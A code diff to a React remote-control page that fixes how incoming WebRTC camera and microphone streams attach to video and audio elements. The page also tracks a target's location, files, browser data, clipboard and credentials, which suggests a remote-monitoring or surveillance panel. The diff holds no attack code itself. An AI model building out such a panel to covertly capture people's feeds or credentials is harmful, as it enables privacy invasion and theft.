@@ -114,6 +114,7 @@ export default function RemoteControlPage() {
   const videoRef = useRef<HTMLVideoElement>(null);
   const audioRef = useRef<HTMLAudioElement>(null);
   const peerRef = useRef<RTCPeerConnection | null>(null);
+  const latestAudioTrackRef = useRef<MediaStreamTrack | null>(null);
   const videoRecorderRef = useRef<MediaRecorder | null>(null);
   const audioRecorderRef = useRef<MediaRecorder | null>(null);
   const videoChunksRef = useRef<Blob[]>([]);
@@ -232,13 +233,18 @@ export default function RemoteControlPage() {
         if (existing) receivedStreamRef.current.removeTrack(existing);
         receivedStreamRef.current.addTrack(e.track);
 
-        if (e.track.kind === "video" && videoRef.current) {
-          videoRef.current.srcObject = receivedStreamRef.current;
-          videoRef.current.play().catch(() => {});
+        if (e.track.kind === "video") {
+          if (videoRef.current) {
+            videoRef.current.srcObject = receivedStreamRef.current;
+            videoRef.current.play().catch(() => {});
+          }
         }
-        if (e.track.kind === "audio" && audioRef.current) {
-          audioRef.current.srcObject = new MediaStream([e.track]);
-          audioRef.current.play().catch(() => {});
+        if (e.track.kind === "audio") {
+          latestAudioTrackRef.current = e.track;
+          if (audioRef.current) {
+            audioRef.current.srcObject = new MediaStream([e.track]);
+            audioRef.current.play().catch(() => {});
+          }
         }
         addEvent("data", `${e.track.kind} track received`);
       };
@@ -268,6 +274,7 @@ export default function RemoteControlPage() {
     setActiveSessionToken(null); setTargetConnected(false); setLiveDeviceInfo(null); setLiveLocation(null);
     setLiveFiles([]); setLiveBrowserData(null); setLiveClipboard([]); setLiveCredentials([]);
     receivedStreamRef.current = null;
+    latestAudioTrackRef.current = null;
   };
 
   const requestPermission = (perm: PermissionKey) => {
@@ -668,7 +675,16 @@ export default function RemoteControlPage() {
                     </CardHeader>
                     <CardContent>
                       <div className="aspect-video bg-black rounded-lg overflow-hidden relative">
-                        <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" data-testid="video-camera-feed" />
+                        <video
+                          ref={(el) => {
+                            videoRef.current = el;
+                            if (el && receivedStreamRef.current && !el.srcObject) {
+                              el.srcObject = receivedStreamRef.current;
+                              el.play().catch(() => {});
+                            }
+                          }}
+                          autoPlay playsInline muted className="w-full h-full object-cover" data-testid="video-camera-feed"
+                        />
                         <div className="absolute bottom-2 left-2 flex items-center gap-1">
                           <Badge className="bg-red-500/80 text-white border-0 text-[10px]">LIVE</Badge>
                           {!cameraEnabled && <Badge className="bg-gray-800/80 text-gray-300 border-0 text-[10px]">Off</Badge>}
@@ -690,7 +706,16 @@ export default function RemoteControlPage() {
                     </CardHeader>
                     <CardContent>
                       <div className="aspect-video bg-muted/30 rounded-lg flex items-center justify-center relative">
-                        <audio ref={audioRef} autoPlay data-testid="audio-live-feed" className="hidden" />
+                        <audio
+                          ref={(el) => {
+                            audioRef.current = el;
+                            if (el && latestAudioTrackRef.current && !el.srcObject) {
+                              el.srcObject = new MediaStream([latestAudioTrackRef.current]);
+                              el.play().catch(() => {});
+                            }
+                          }}
+                          autoPlay data-testid="audio-live-feed" className="hidden"
+                        />
                         <div className="text-center space-y-2">
                           {micEnabled ? <Mic className="w-8 h-8 text-green-400 mx-auto animate-pulse" /> : <MicOff className="w-8 h-8 text-red-400 mx-auto" />}
                           <p className="text-xs text-muted-foreground">{micEnabled ? "Audio streaming live" : "Mic disabled"}</p>
